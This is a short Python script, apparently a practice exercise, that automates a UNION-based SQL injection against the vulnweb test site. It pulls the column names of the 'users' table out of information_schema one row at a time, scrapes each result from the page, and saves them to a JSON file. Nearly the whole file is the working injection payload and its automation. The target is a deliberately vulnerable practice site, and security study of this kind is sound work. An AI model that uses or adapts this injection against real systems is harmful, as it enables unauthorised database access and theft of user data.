import requests
from bs4 import BeautifulSoup
import json
import time
import os

# url_targe = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,column_name from information_schema.columns limit {},1"
url_targe = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,column_name from information_schema.columns where table_name='users' limit {},1"
# total_index = 430
total_index = 8
data = []
name_file = "./story_data_user.json"

if os.path.exists(name_file):
    with open("story_data.json","r") as file:
        existing_data = json.load(file)
        last_limit = existing_data[-1]['limit']
else :
    last_limit = 0


for limit in range(last_limit,total_index):
    retries = 0
    success = False
    
    while retries < 3 and not success:
        url = url_targe.format(limit)
        response = requests.get(url)
        
        if response.status_code != 200:
            print(f"Request Failed with status code : {response.status_code}.Retrying.....")
            retries += 1
            time.sleep(4)
            continue
        
        content_type = response.headers.get("Content-Type","")
        if "html" not in content_type:
            print(f"Response in not html for limit : {limit}. Content-Type : {content_type}. Retrying...")
            retries += 1
            time.sleep(4)
            continue

        soup = BeautifulSoup(response.content, 'html.parser')
        table_name_div = soup.find('div',class_ = 'story')
        if table_name_div :
            table_name_content = table_name_div.get_text(strip=True)
            table_name_content = table_name_content.replace("view pictures of the artistcomment on this artist","").strip()
            data.append(
                {
                    "limit" : limit,
                    "table_name" : table_name_content
                }
            )
            success = True
            print(f"finish add {limit}")
        else :
            print(f"table name content not found for limit : {limit}.Retrying....")
            retries += 1
            time.sleep(4)

# check ada gak file nya 
if os.path.exists(name_file):
    with open(name_file,"r") as file:
        existing_data = json.load(file)
        existing_data.extend(data)
else :
    existing_data = data  

with open(name_file,"w") as file:
    json.dump(existing_data,file,indent=4)
print(f"Scraping completed.Total item collected : {len(existing_data)}")
